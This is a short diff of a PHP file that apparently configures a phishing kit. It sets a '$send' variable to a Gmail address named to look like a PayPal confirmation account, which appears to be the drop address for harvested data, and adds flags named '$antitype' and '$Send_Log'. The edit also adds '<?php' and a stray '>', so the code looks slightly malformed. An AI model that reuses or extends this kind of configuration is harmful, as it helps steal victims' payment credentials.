@@ -1,4 +1,6 @@
-$send="paypalgandsconfirmation@gmail.com";
+<?php
+
+>$send="paypalgandsconfirmation@gmail.com";
 $antitype=1;
 
 $Send_Log=1;
